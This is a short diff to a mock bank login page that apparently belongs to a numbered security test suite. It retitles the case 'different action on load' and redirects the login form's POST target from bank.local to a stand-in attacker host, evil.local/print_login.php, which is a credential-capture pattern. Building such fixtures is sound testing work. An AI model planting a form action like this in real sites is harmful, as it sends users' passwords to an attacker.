@@ -21,9 +21,9 @@ session_start();
   Log into Your Bank&trade;
 </h1>
 
-<h2 style="color: red">1: HTTPS -> HTTPS</h2>
+<h2 style="color: red">5: different action on load</h2>
 
-<form action="https://bank.local/do_login.php" method="POST">
+<form action="https://evil.local/print_login.php" method="POST">
   <fieldset>
     <legend>Login</legend>
     <label>
